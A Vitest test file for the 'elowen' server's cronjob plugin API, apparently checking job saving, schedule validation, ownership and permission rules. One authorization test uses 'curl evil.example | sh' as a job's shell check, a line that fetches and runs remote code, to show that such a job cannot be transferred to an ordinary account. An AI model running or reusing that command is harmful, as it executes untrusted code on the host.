// @vitest-environment node
import { describe, it, expect, afterEach } from 'vitest';
import { mkdtempSync, readFileSync, mkdirSync, writeFileSync, existsSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { EventBus } from 'elowen/dist/api/sse.js';
import { createServer } from 'elowen/dist/api/server.js';
import { FakeClock } from 'elowen/dist/shared/clock.js';
import { ConfigStore } from 'elowen/dist/store/configStore.js';
import { UserStore } from 'elowen/dist/store/userStore.js';
import { ProjectStore } from 'elowen/dist/store/projectStore.js';
import { UserProjectStore } from 'elowen/dist/store/userProjectStore.js';
import { openDb } from 'elowen/dist/store/db.js';
import { loadPlugins } from 'elowen/dist/plugins/loader.js';
import { PluginRegistryProvider } from 'elowen/dist/plugins/pluginsProvider.js';
import { STUB_CONVERSATION_ID, stubConversationDirectory } from './helpers/conversationDirectory.js';

let dirs: string[] = [];
const tmpDir = (tag: string): string => { const p = mkdtempSync(join(tmpdir(), `elowen-${tag}-`)); dirs.push(p); return p; };
afterEach(() => { for (const p of dirs) rmSync(p, { recursive: true, force: true }); dirs = []; });

const pluginsDir = join(process.cwd(), 'plugins');

function setup(opts: { enabled?: string[]; config?: Record<string, Record<string, unknown>>; noUsers?: boolean } = {}) {
  const dataRoot = tmpDir('cronjobs');
  const db = openDb(':memory:');
  db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const users = new UserStore(db);
  // `noUsers` is SETUP MODE: before the first account exists the API is unauthenticated by design.
  const admin = opts.noUsers ? { id: 0 } : users.create('admin', 'pw');
  const amy = opts.noUsers ? { id: 0 } : users.create('amy', 'pw');
  // The '/plugins/cronjob/jobs' surface is served by the REAL cronjob plugin (root mounts) now.
  const provider = new PluginRegistryProvider(() => loadPlugins({
    dirs: [pluginsDir], enabled: opts.enabled ?? ['cronjob'], dataRoot, config: opts.config,
    host: {
      stores: {
        projects: new ProjectStore(db),
        userProjects: new UserProjectStore(db),
        usersRead: {
          list: () => users.list().map((user) => ({
            id: user.id, username: user.username, name: user.name, avatar: user.avatar, isAdmin: user.is_admin,
          })),
          isAdmin: (id: number) => users.isAdmin(id),
          allowedExecs: (id: number) => users.list().find((user) => user.id === id)?.allowed_execs ?? null,
          mayUsePlugin: (id: number, plugin: string) => {
            const user = users.list().find((candidate) => candidate.id === id);
            return user?.is_admin === true || user?.granted_plugins.includes(plugin) === true;
          },
        },
        // A recurring job names the conversation it is organized under, so these cases need a directory
        // that answers. What makes a target eligible is cronConversationGroups.test.ts's subject.
        conversationsRead: stubConversationDirectory(),
      },
    } as never,
    logger: { info: () => {}, warn: () => {}, error: () => {} },
  }));
  const app = createServer({
    bus: new EventBus(),
    engine: null as never, spawn: null as never, tmux: null as never,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' },
    clock: new FakeClock(0), config: new ConfigStore(db), users, projects: new ProjectStore(db), userProjects: new UserProjectStore(db),
    pluginDataRoot: dataRoot, pluginDirs: [pluginsDir],
    plugins: provider,
  });
  return {
    app, dataRoot, db, users, amy,
    adminTok: opts.noUsers ? '' : users.issueToken(admin.id),
    amyTok: opts.noUsers ? '' : users.issueToken(amy.id),
  };
}
const auth = (t: string) => ({ headers: { authorization: `Bearer ${t}` } });
const put = (t: string, body: unknown) => ({ method: 'PUT', headers: { authorization: `Bearer ${t}`, 'content-type': 'application/json' }, body: JSON.stringify(body) });
const del = (t: string) => ({ method: 'DELETE', headers: { authorization: `Bearer ${t}` } });
const post = (t: string) => ({ method: 'POST', headers: { authorization: `Bearer ${t}` } });

const job = (extra: Record<string, unknown> = {}) => ({
  id: 'j1', name: 'digest', schedule: 'daily 06:00', prompt: 'Summarize the day.', createdAt: '2026-07-01T00:00:00.000Z',
  conversationSessionId: STUB_CONVERSATION_ID, ...extra,
});
/** The read-only projection GET adds for a stored association: the conversation as it stands today. */
const conversationView = (ownerUserId = 0) =>
  ({ id: STUB_CONVERSATION_ID, title: 'Chat', ownerUserId, platform: null, direct: false });
/** Save one job through the route that owns it. */
const save = (app: { request: (path: string, init: unknown) => Promise<Response> }, tok: string, j: Record<string, unknown>) =>
  app.request(`/plugins/cronjob/jobs/${j.id}`, put(tok, j));
const seed = (dataRoot: string, jobs: unknown[]): string => {
  const file = join(dataRoot, 'cronjob', 'jobs.json');
  mkdirSync(join(dataRoot, 'cronjob'), { recursive: true });
  writeFileSync(file, JSON.stringify(jobs));
  return file;
};
const onDisk = (dataRoot: string) => JSON.parse(readFileSync(join(dataRoot, 'cronjob', 'jobs.json'), 'utf-8'));

describe('cron jobs routes', () => {
  it('persists an explicit execution project independently of filing and preserves it on legacy edits', async () => {
    const { app, adminTok, dataRoot } = setup();
    const first = await save(app, adminTok, job({ projectRef: { kind: 'host', projectId: 1 } }));
    expect(first.status).toBe(200);
    expect(onDisk(dataRoot)[0]).toMatchObject({ projectRef: { kind: 'host', projectId: 1 }, conversationSessionId: STUB_CONVERSATION_ID });
    expect((await save(app, adminTok, job({ prompt: 'updated' }))).status).toBe(200);
    expect(onDisk(dataRoot)[0].projectRef).toEqual({ kind: 'host', projectId: 1 });
  });
  it('refuses another project and explicit host administration for a non-admin', async () => {
    const { app, amyTok, amy, users } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    expect((await save(app, amyTok, job({ projectRef: { kind: 'managed', projectId: 999 } }))).status).toBe(403);
    expect((await save(app, amyTok, job({ projectRef: { kind: 'host' } }))).status).toBe(403);
  });
  it('refuses a managed execution target without its provider instead of saving a host fallback', async () => {
    const { app, adminTok, users, db, dataRoot } = setup();
    db.prepare("UPDATE projects SET execution_kind='managed' WHERE id=1").run();
    const response = await save(app, adminTok, job({ ownerUserId: users.list()[0]!.id, projectRef: { kind: 'managed', projectId: 1 } }));
    expect(response.status).toBe(503);
    expect(existsSync(join(dataRoot, 'cronjob', 'jobs.json'))).toBe(false);
  });

  it('GET returns [] when the jobs file does not exist yet', async () => {
    const { app, adminTok } = setup();
    const res = await app.request('/plugins/cronjob/jobs', auth(adminTok));
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual([]);
  });

  // A read that cannot be answered must never read as "you have nothing scheduled" — an empty list
  // IS a claim, and a wrong one. The strict read answers a machine-readable failure instead.
  it('GET answers 500 jobs_unreadable for a corrupted jobs file, never a success-shaped empty', async () => {
    const { app, dataRoot, adminTok } = setup();
    mkdirSync(join(dataRoot, 'cronjob'), { recursive: true });
    writeFileSync(join(dataRoot, 'cronjob', 'jobs.json'), '{not json');
    const res = await app.request('/plugins/cronjob/jobs', auth(adminTok));
    expect(res.status).toBe(500);
    expect(await res.json()).toMatchObject({ code: 'jobs_unreadable' });
  });

  // jobs.json is shared with the scheduler and the brain's CronAdd tool. A client that could hand over
  // the whole list would delete whatever it had not seen — the way an open browser tab silently dropped
  // jobs added behind its back. So a write names ONE job, and every other job on disk survives it.
  it('a save leaves every other job on disk alone — including one the client never saw', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ id: 'known' }), job({ id: 'added-behind-your-back', name: 'Nightly report' })]);
    expect((await save(app, adminTok, job({ id: 'known', prompt: 'Edited.' }))).status).toBe(200);
    expect(onDisk(dataRoot).map((j: { id: string }) => j.id)).toEqual(['known', 'added-behind-your-back']);
    expect(onDisk(dataRoot)[0].prompt).toBe('Edited.');
  });

  // Where a job is FILED and where it RUNS are two different facts, and a page that shows only the first
  // sends the reader to the schedule's editor when they were looking for the transcript. The run location
  // is derived from the one place that decides it, so the listing and the scheduler cannot disagree.
  it('GET says where each job runs, beside the conversation it is filed under', async () => {
    const { app, dataRoot, adminTok, amy, amyTok, users } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    seed(dataRoot, [
      job({ id: 'shared', name: 'instance digest' }),
      job({ id: 'owned', name: 'her digest', ownerUserId: amy.id }),
      job({ id: 'channelled', name: 'to a room', ownerUserId: amy.id, notifyChannelId: 'destination:discord:100' }),
    ]);
    // The admin reads the instance jobs; the owner reads her own.
    const sharedRows = await (await app.request('/plugins/cronjob/jobs', auth(adminTok))).json() as {
      id: string; runLocation: { kind: string; sessionId?: string; channelId?: string };
    }[];
    expect(sharedRows.map((row) => row.id)).toEqual(['shared']); // instance only; hers stay private
    expect(sharedRows[0]!.runLocation).toEqual({ kind: 'channel', channelId: 'job-shared' });

    const herRows = await (await app.request('/plugins/cronjob/jobs', auth(amyTok))).json() as {
      id: string; runLocation: { kind: string; sessionId?: string; channelId?: string };
    }[];
    const byId = new Map(herRows.map((row) => [row.id, row.runLocation]));
    expect(byId.get('channelled')).toEqual({ kind: 'channel', channelId: 'job-channelled' });
    // Every other owned recurring job runs in a conversation of its own, named after the job.
    expect(byId.get('owned')).toEqual({ kind: 'dedicated', sessionId: `brain-${amy.id}-job-owned` });
  });

  // Derived on the way out, never stored: a client that echoes the projection back must not be able to
  // write a location the scheduler would then not honour.
  it('never stores a run location a client sent back', async () => {
    const { app, dataRoot, adminTok } = setup();
    const res = await save(app, adminTok, { ...job({}), runLocation: { kind: 'channel', channelId: 'job-elsewhere' } });
    expect(res.status).toBe(200);
    expect(onDisk(dataRoot)[0]).not.toHaveProperty('runLocation');
  });

  it('rejects a stale revision and returns the current job snapshot', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ revision: 3, prompt: 'Server copy.' })]);
    const res = await save(app, adminTok, job({ prompt: 'Stale copy.', expectedRevision: 2 }));
    expect(res.status).toBe(409);
    expect(await res.json()).toMatchObject({ conflict: true, current: { revision: 3, prompt: 'Server copy.' } });
    expect(onDisk(dataRoot)[0].prompt).toBe('Server copy.');
  });

  it('increments the revision after a conditional save', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ revision: 4 })]);
    const res = await save(app, adminTok, job({ prompt: 'Edited.', expectedRevision: 4 }));
    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ revision: 5, job: { revision: 5, prompt: 'Edited.' } });
  });

  it('a save creates the job when it is new, and GET round-trips it (recurring + one-shot)', async () => {
    const { app, dataRoot, adminTok } = setup();
    // lastRun/lastResult are scheduler-owned: the save strips them from the client payload (nothing was
    // on disk to merge back), so the round-trip returns the jobs WITHOUT those fields.
    const jobs = [
      job({ hours: '5-21', notifyChannelId: '123', enabled: false, lastRun: '2026-07-01T06:00:10.000Z', lastResult: 'ok' }),
      job({ id: 'j2', name: 'wakeup', schedule: 'in 20m', runAt: '2026-07-02T18:00:00.000Z' }),
    ];
    for (const j of jobs) expect((await save(app, adminTok, j)).status).toBe(200);
    const stripped = jobs.map(({ lastRun: _lr, lastResult: _lres, ...j }: Record<string, unknown>) => ({ ...j, revision: 1 }));
    const back = await app.request('/plugins/cronjob/jobs', auth(adminTok));
    // The conversation the job is filed under is projected for the client as it stands TODAY; the
    // immutable key it is stored by never leaves the daemon. Where the job RUNS is projected beside it,
    // and both instance jobs here run in a cron channel of their own. The plan's additive projection
    // rides beside all of it: derived lifecycle, revision, the server-derived next occurrence and
    // the durable manual queue state.
    const rows = await back.json() as Record<string, unknown>[];
    expect(rows.map((row) => ({
      ...row,
      // A server-derived next occurrence depends on the scheduler's clock; assert its SHAPE per row.
      nextOccurrence: undefined,
    }))).toEqual(stripped.map((j) => ({
      ...j,
      lifecycle: j.runAt !== undefined ? 'oneShot' : 'recurring',
      manualQueued: false,
      conversation: conversationView(),
      runLocation: { kind: 'channel', channelId: `job-${j.id}` },
    })));
    // The recurring row is PAUSED here, so its next occurrence is (truthfully) null until it is
    // re-enabled; the pending one-shot shows a late wake-up with its original runAt intact.
    expect(rows[0]!.nextOccurrence).toBeNull();
    expect(rows[1]!.nextOccurrence).toEqual(expect.objectContaining({
      occurrenceId: 'j2:once',
      scheduledAt: '2026-07-02T18:00:00.000Z',
      timezone: expect.any(String),
      disposition: expect.stringMatching(/^(dueNow|late)$/),
      precisionMs: expect.any(Number),
      guarded: false,
    }));
    // The plugin's scheduler reads this exact file every tick — verify it landed on disk.
    expect(existsSync(join(dataRoot, 'cronjob', 'jobs.json'))).toBe(true);
    expect(onDisk(dataRoot)).toEqual(stripped.map((j) => ({ ...j, conversationKey: `ns-${STUB_CONVERSATION_ID}` })));
  });

  it('a save keeps the scheduler-owned run state (lastRun, lastSlot, lastResult) over a stale client copy', async () => {
    const { app, dataRoot, adminTok } = setup();
    // The scheduler stamped a fresh run on disk while the UI held an older snapshot.
    seed(dataRoot, [job({ enabled: true, lastRun: '2026-07-02T15:00:00.000Z', lastSlot: '2026-07-02T15:00', lastResult: 'fresh' })]);
    await save(app, adminTok, job({ enabled: true, lastRun: '2026-07-01T00:00:00.000Z', lastResult: 'stale', prompt: 'Edited prompt.' }));
    const saved = onDisk(dataRoot)[0];
    expect(saved.prompt).toBe('Edited prompt.');            // the edit itself lands
    expect(saved.lastRun).toBe('2026-07-02T15:00:00.000Z'); // the scheduler's stamps survive
    expect(saved.lastSlot).toBe('2026-07-02T15:00');        // dropping this re-fires a slot already run
    expect(saved.lastResult).toBe('fresh');
  });

  it('a save arms a job from NOW when it flips to enabled (and for a new enabled job)', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ enabled: false, lastRun: '2026-07-01T06:00:10.000Z' })]);
    const before = Date.now();
    await save(app, adminTok, job({ enabled: true }));                            // paused → enabled: re-arm from now
    await save(app, adminTok, job({ id: 'new1', name: 'fresh', enabled: true })); // brand-new enabled job: armed too
    await save(app, adminTok, job({ id: 'new2', name: 'parked', enabled: false })); // brand-new paused job: no stamp
    const saved = onDisk(dataRoot);
    expect(Date.parse(saved[0].lastRun)).toBeGreaterThanOrEqual(before); // not the old 06:00 stamp
    expect(Date.parse(saved[1].lastRun)).toBeGreaterThanOrEqual(before);
    expect(saved[2].lastRun).toBeUndefined();
  });

  it('a save keeps lastRun untouched for a job that stays enabled', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ enabled: true, lastRun: '2026-07-02T15:00:00.000Z' })]);
    await save(app, adminTok, job({ enabled: true, name: 'renamed' }));
    const saved = onDisk(dataRoot)[0];
    expect(saved.name).toBe('renamed');
    expect(saved.lastRun).toBe('2026-07-02T15:00:00.000Z');
  });

  it('the URL names the job a save writes — a body id cannot redirect it', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ id: 'victim', name: 'keep me' })]);
    await app.request('/plugins/cronjob/jobs/mine', put(adminTok, job({ id: 'victim', name: 'overwritten' })));
    expect(onDisk(dataRoot).map((j: { id: string; name: string }) => [j.id, j.name]))
      .toEqual([['victim', 'keep me'], ['mine', 'overwritten']]);
  });

  it('DELETE removes just that job, and deleting one that is already gone still succeeds', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ id: 'j1' }), job({ id: 'j2' })]);
    expect((await app.request('/plugins/cronjob/jobs/j1', del(adminTok))).status).toBe(200);
    expect(onDisk(dataRoot).map((j: { id: string }) => j.id)).toEqual(['j2']);
    // Idempotent: a client that says "this job should not exist" must not have to know whether it still
    // does — that is what lets it delete a job whose own creating save is still on the wire.
    expect((await app.request('/plugins/cronjob/jobs/j1', del(adminTok))).status).toBe(200);
    expect(onDisk(dataRoot).map((j: { id: string }) => j.id)).toEqual(['j2']);
  });

  // A write that read the file at the wrong moment (truncated, or not a list) and saw "no jobs" would
  // put ONE job back where twelve were — the very loss this endpoint exists to stop.
  it('lets an unidentified caller (setup mode) neither create nor DELETE a job', async () => {
    const { app, dataRoot } = setup({ noUsers: true });
    seed(dataRoot, [job({ id: 'instance-job' })]);
    // An instance job has no owner, so an owner comparison alone would read `null === null` as "mine"
    // and let onboarding destroy jobs it is not even allowed to create.
    expect((await app.request('/plugins/cronjob/jobs/instance-job', { method: 'DELETE' })).status).toBe(403);
    expect((await app.request('/plugins/cronjob/jobs/j1', {
      method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify(job()),
    })).status).toBe(403);
    expect(onDisk(dataRoot).map((j: { id: string }) => j.id)).toEqual(['instance-job']);
  });

  it('refuses to write over a jobs file it could not read, and leaves it untouched', async () => {
    const { app, dataRoot, adminTok } = setup();
    const file = join(dataRoot, 'cronjob', 'jobs.json');
    for (const corrupt of ['{not json', '{"jobs": []}']) { // truncated mid-write, or simply not a list
      mkdirSync(join(dataRoot, 'cronjob'), { recursive: true });
      writeFileSync(file, corrupt);
      expect((await save(app, adminTok, job())).status, corrupt).toBe(500);
      expect((await app.request('/plugins/cronjob/jobs/j1', del(adminTok))).status, corrupt).toBe(500);
      expect(readFileSync(file, 'utf-8')).toBe(corrupt);
    }
  });

  // Arming is about the scheduler's whole run state: dueSlot decides a daily/weekly job on lastSlot alone,
  // so a stale slot left behind on a re-enabled job fires it on the spot.
  it('a job re-enabled after its slot has passed does not fire again for that slot', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ schedule: 'daily 07:30', enabled: false, lastRun: '2026-07-06T07:30:05.000Z', lastSlot: '2026-07-06T07:30' })]);
    await save(app, adminTok, job({ schedule: 'daily 07:30', enabled: true }));
    const saved = onDisk(dataRoot)[0];
    expect(saved.lastSlot).toBeUndefined();                          // Monday's slot no longer speaks for today
    expect(Date.parse(saved.lastRun)).toBeGreaterThan(Date.parse('2026-07-06T07:30:05.000Z'));
  });

  // The brain's CronAdd accepts 5-field cron expressions; a validator that rejects them makes the jobs it
  // creates uneditable from the UI.
  it('accepts the cron expressions the plugin accepts, and rejects malformed ones', async () => {
    const { app, adminTok } = setup();
    for (const schedule of ['0 9 * * 1-5', '*/5 * * * *', '0 0 1 * *', '30 6 * jan-mar mon,fri']) {
      expect((await save(app, adminTok, job({ schedule }))).status, schedule).toBe(200);
    }
    for (const schedule of ['70 * * * *', '0 9 * *', '0 9 * * 1-5 7', '5-1 * * * *', '* * * * xyz']) {
      expect((await save(app, adminTok, job({ schedule }))).status, schedule).toBe(400);
    }
  });

  it('a save accepts every valid schedule shape', async () => {
    const { app, adminTok } = setup();
    for (const schedule of ['every 15m', 'every 2h', 'daily 07:30', 'weekly sun 20:00']) {
      expect((await save(app, adminTok, job({ schedule }))).status, schedule).toBe(200);
    }
  });

  it('a save rejects an invalid schedule (400)', async () => {
    const { app, adminTok } = setup();
    for (const schedule of ['every 0m', 'hourly', 'daily 25:00', 'weekly xyz 10:00', '']) {
      expect((await save(app, adminTok, job({ schedule }))).status, schedule).toBe(400);
    }
    // A one-shot job with an unparseable runAt is invalid too.
    expect((await save(app, adminTok, job({ runAt: 'not-a-date' }))).status).toBe(400);
  });

  it('a save round-trips a valid per-job model and rejects a malformed one (400)', async () => {
    const { app, dataRoot, adminTok } = setup();
    expect((await save(app, adminTok, job({ model: { provider: 'anthropic', model: 'claude-sonnet-5' } }))).status).toBe(200);
    expect(onDisk(dataRoot)[0].model).toEqual({ provider: 'anthropic', model: 'claude-sonnet-5' });
    // Malformed model objects are rejected; an absent model is fine (default model runs).
    for (const model of [{ provider: 'anthropic' }, { model: 'x' }, { provider: '', model: 'x' }, 'anthropic/x']) {
      expect((await save(app, adminTok, job({ model }))).status, JSON.stringify(model)).toBe(400);
    }
    expect((await save(app, adminTok, job())).status).toBe(200); // no model → ok
  });

  it('a save rejects a body that is not a job object, or one missing required fields (400)', async () => {
    const { app, adminTok } = setup();
    expect((await app.request('/plugins/cronjob/jobs/x', put(adminTok, [job()]))).status).toBe(400);
    expect((await app.request('/plugins/cronjob/jobs/x', put(adminTok, { name: '', schedule: 'every 1h', prompt: 'p' }))).status).toBe(400);
    expect((await app.request('/plugins/cronjob/jobs/x', put(adminTok, { name: 'n', schedule: 'every 1h' }))).status).toBe(400);
  });

  it('accepts only a non-empty destination, while normalizing the empty value GET may round-trip', async () => {
    const { app, dataRoot, adminTok } = setup();
    for (const notifyChannelId of [null, [], {}]) {
      expect((await save(app, adminTok, job({ notifyChannelId: notifyChannelId as never }))).status, JSON.stringify(notifyChannelId)).toBe(400);
    }
    expect((await save(app, adminTok, job({ notifyChannelId: '' }))).status).toBe(200);
    expect(onDisk(dataRoot)[0]).not.toHaveProperty('notifyChannelId');
    expect((await save(app, adminTok, job({ notifyChannelId: 'destination:msteams:a%3Achat' }))).status).toBe(200);
  });

  // Cronjob is a user-grantable plugin: an account the admin has not granted it reaches nothing, and the
  // refusal happens in the core HTTP gate before the plugin sees the request.
  it('rejects an ungranted non-admin (403) on GET, save and DELETE', async () => {
    const { app, amyTok } = setup();
    expect((await app.request('/plugins/cronjob/jobs', auth(amyTok))).status).toBe(403);
    expect((await save(app, amyTok, job())).status).toBe(403);
    expect((await app.request('/plugins/cronjob/jobs/j1', del(amyTok))).status).toBe(403);
  });

  it('gives a granted non-admin her OWN jobs, and nobody else\'s', async () => {
    const { app, users, amy, amyTok, adminTok } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    expect((await save(app, adminTok, job({ id: 'shared', name: 'instance job' }))).status).toBe(200);

    // Ownership comes from the SERVER: a body claiming otherwise cannot make it someone else's job.
    expect((await save(app, amyTok, job({ id: 'mine', name: 'my job', ownerUserId: 1 }))).status).toBe(200);
    const mine = (await (await app.request('/plugins/cronjob/jobs', auth(amyTok))).json()) as { id: string; ownerUserId?: number | null }[];
    expect(mine.map((j) => j.id)).toEqual(['mine']);
    expect(mine[0]!.ownerUserId).toBe(amy.id);

    // An admin sees OWN personal jobs plus the instance ones — never another account's. A foreign
    // personal job reads the same as an absent one on GET, update, delete and run.
    const all = (await (await app.request('/plugins/cronjob/jobs', auth(adminTok))).json()) as { id: string; ownerUserId?: number | null }[];
    expect(all.map((j) => j.id)).toEqual(['shared']);
    expect(all.find((j) => j.id === 'shared')).not.toHaveProperty('ownerUserId');

    // She may not reach the instance job — neither to edit nor to delete it; the refusal is 404, the
    // same answer an id that does not exist gives.
    expect((await save(app, amyTok, job({ id: 'shared', name: 'hijacked' }))).status).toBe(404);
    expect((await app.request('/plugins/cronjob/jobs/shared', del(amyTok))).status).toBe(404);
    expect((await app.request('/plugins/cronjob/jobs/shared/run', post(amyTok))).status).toBe(404);
    const still = (await (await app.request('/plugins/cronjob/jobs', auth(adminTok))).json()) as { id: string; name: string }[];
    expect(still.find((j) => j.id === 'shared')?.name).toBe('instance job');
    expect((await (await app.request('/plugins/cronjob/jobs', auth(amyTok))).json() as { id: string }[]).map((j) => j.id)).toEqual(['mine']);
  });

  it('gates manual runs by ownership and refuses one-shot wake-ups', async () => {
    const { app, users, amy, amyTok, adminTok } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    expect((await save(app, adminTok, job({ id: 'shared' }))).status).toBe(200);
    expect((await save(app, amyTok, job({ id: 'mine' }))).status).toBe(200);
    expect((await save(app, amyTok, job({ id: 'wake', schedule: 'in 20m', runAt: '2026-09-01T12:00:00.000Z' }))).status).toBe(200);

    expect((await app.request('/plugins/cronjob/jobs/shared/run', post(amyTok))).status).toBe(404);
    expect((await (await app.request('/plugins/cronjob/jobs/shared/run', post(adminTok))).text()).includes('run_already_queued')).toBe(false);
    expect((await app.request('/plugins/cronjob/jobs/wake/run', post(amyTok))).status).toBe(400);
    // This API-only harness does not connect a brain handler; reaching 503 proves the authorized request
    // reached the live adapter instead of being refused by ownership or route parsing.
    expect((await app.request('/plugins/cronjob/jobs/mine/run', post(amyTok))).status).toBe(503);
    const second = await app.request('/plugins/cronjob/jobs/mine/run', post(amyTok));
    expect(((await second.json()) as { code?: string }).code).toBe('scheduler_unavailable');
  });

  it('enriches visible owned jobs with a safe display profile and never persists that view metadata', async () => {
    const { app, dataRoot, db, users, amy, adminTok, amyTok } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    db.prepare('UPDATE users SET name = ?, email = ?, avatar = ? WHERE id = ?')
      .run('Amy Adams', 'amy-secret@example.test', 'amy.png', amy.id);
    expect((await save(app, amyTok, job({ id: 'mine', name: 'Amy job' }))).status).toBe(200);

    // An admin no longer sees another account's personal rows — the profile projection only ever
    // rides on the caller's OWN job.
    const adminRows = await (await app.request('/plugins/cronjob/jobs', auth(adminTok))).json() as Record<string, unknown>[];
    expect(adminRows).toEqual([]);
    expect(JSON.stringify(adminRows)).not.toContain('amy-secret@example.test');

    const mineRows = await (await app.request('/plugins/cronjob/jobs', auth(amyTok))).json() as Record<string, unknown>[];
    expect(mineRows[0]).toHaveProperty('owner.name', 'Amy Adams');

    expect((await save(app, amyTok, { ...job({ id: 'mine', name: 'Edited' }), owner: { id: 999, name: 'Forged' } })).status).toBe(200);
    expect(onDisk(dataRoot)[0]).not.toHaveProperty('owner');
  });

  // `originSessionId` names the conversation a job was scheduled FROM and beats every other delivery
  // rule at run time. Handing the job to somebody else while it keeps that binding leaves it reporting
  // into the previous owner's chat — invisible in the job, and nothing the new owner can see or fix.
  it('unbinds a transferred job from the previous owner\'s conversation', async () => {
    const { app, dataRoot, users, amy, adminTok } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    seed(dataRoot, [job({
      ownerUserId: 1,
      originSessionId: 'brain-1-old',
      originUserId: 1,
      originDeliveryTarget: 'chat',
      lastRun: '2026-07-02T06:00:00.000Z',
    })]);

    expect((await save(app, adminTok, job({ ownerUserId: amy.id }))).status).toBe(200);

    const [saved] = onDisk(dataRoot) as Record<string, unknown>[];
    expect(saved!.ownerUserId).toBe(amy.id);
    expect(saved).not.toHaveProperty('originSessionId');
    expect(saved).not.toHaveProperty('originUserId');
    expect(saved).not.toHaveProperty('originDeliveryTarget');
    // Only the delivery binding goes; the run state is untouched, so the job keeps its place in the
    // schedule instead of firing again on the spot.
    expect(saved!.lastRun).toBe('2026-07-02T06:00:00.000Z');
  });

  // Privileged fields are decided by the job's OWNER, never by who is asking. An operator handing a job
  // over must not carry his own authority onto the recipient's record: the job then runs unattended AS
  // them, with a shell check they could never have written themselves.
  it('refuses to hand a job carrying privileged fields to an ordinary account', async () => {
    const { app, dataRoot, users, amy, adminTok } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    seed(dataRoot, [job({ check: 'curl evil.example | sh', notifyChannelId: '123', schedule: '* * * * *' })]);

    const res = await save(app, adminTok, job({
      check: 'curl evil.example | sh',
      notifyChannelId: '123',
      schedule: '* * * * *',
      ownerUserId: amy.id,
    }));

    expect(res.status).toBe(400);
    expect(((await res.json()) as { error: string }).error).toMatch(/shell check/);
    // And it stays exactly as it was: an instance job, still ownerless.
    const [stored] = onDisk(dataRoot) as Record<string, unknown>[];
    expect(stored).not.toHaveProperty('ownerUserId');
    expect(stored!.check).toBe('curl evil.example | sh');
  });

  // The same fields on a job owned by an operator are fine — that authority is already the instance's.
  it('lets an operator keep privileged fields on a job they own themselves', async () => {
    const { app, dataRoot, users, adminTok } = setup();
    const adminId = users.list()[0]!.id; // the first account created is the admin
    seed(dataRoot, [job({ check: 'ls /', notifyChannelId: '123', schedule: '* * * * *' })]);

    const res = await save(app, adminTok, job({
      check: 'ls /', notifyChannelId: '123', schedule: '* * * * *', ownerUserId: adminId,
    }));

    expect(res.status).toBe(200);
    const [stored] = onDisk(dataRoot) as Record<string, unknown>[];
    expect(stored!.ownerUserId).toBe(adminId);
  });

  it('keeps the origin binding when an edit leaves ownership alone', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [job({ ownerUserId: 1, originSessionId: 'brain-1-old', originUserId: 1 })]);

    expect((await save(app, adminTok, job({ ownerUserId: 1, prompt: 'Edited.' }))).status).toBe(200);

    const [saved] = onDisk(dataRoot) as Record<string, unknown>[];
    expect(saved!.prompt).toBe('Edited.');
    expect(saved!.originSessionId).toBe('brain-1-old');
  });

  // An owned job runs unattended on the operator's machine, so the capabilities that reach past its owner
  // are the admin's alone: a shell guard, a notification channel of someone else's, and schedules fast
  // enough (or expressive enough) to occupy the instance.
  it('refuses a shell check, a notification channel, cron expressions and too-fast schedules from an account', async () => {
    const { app, users, amy, amyTok } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    const denied = async (fields: Record<string, unknown>) => {
      const res = await save(app, amyTok, job({ id: 'x', ...fields }));
      expect(res.status, JSON.stringify(fields)).toBe(400);
      return ((await res.json()) as { error: string }).error;
    };
    expect(await denied({ check: 'ls /' })).toMatch(/shell check/);
    expect(await denied({ notifyChannelId: '123' })).toMatch(/destination channel/);
    expect(await denied({ schedule: '*/5 * * * *' })).toMatch(/cron expressions/);
    expect(await denied({ schedule: 'every 1m' })).toMatch(/shortest interval/);
    // The plain forms she is meant to use go through.
    expect((await save(app, amyTok, job({ id: 'ok', schedule: 'daily 07:30' }))).status).toBe(200);
  });

  it('caps how many jobs one account may keep', async () => {
    const { app, users, amy, amyTok } = setup({ config: { cronjob: { maxJobsPerUser: 2 } } });
    users.setGrantedPlugins(amy.id, ['cronjob']);
    expect((await save(app, amyTok, job({ id: 'a' }))).status).toBe(200);
    expect((await save(app, amyTok, job({ id: 'b' }))).status).toBe(200);
    const res = await save(app, amyTok, job({ id: 'c' }));
    expect(res.status).toBe(400);
    expect(((await res.json()) as { error: string }).error).toMatch(/already have 2/);
    // Editing one she already owns is not "another job" — the cap must not lock her out of her own list.
    expect((await save(app, amyTok, job({ id: 'b', name: 'renamed' }))).status).toBe(200);
  });

  // A job left behind has no owner to run as and no conversation to report into, yet the scheduler would
  // keep paying for its turns on every slot, forever.
  it('drops an account\'s jobs when the account is deleted', async () => {
    const { app, users, amy, amyTok, adminTok } = setup();
    users.setGrantedPlugins(amy.id, ['cronjob']);
    await save(app, adminTok, job({ id: 'shared' }));
    await save(app, amyTok, job({ id: 'hers' }));

    expect((await app.request(`/users/${amy.id}`, del(adminTok))).status).toBe(200);
    const left = (await (await app.request('/plugins/cronjob/jobs', auth(adminTok))).json()) as { id: string }[];
    expect(left.map((j) => j.id)).toEqual(['shared']);
  });

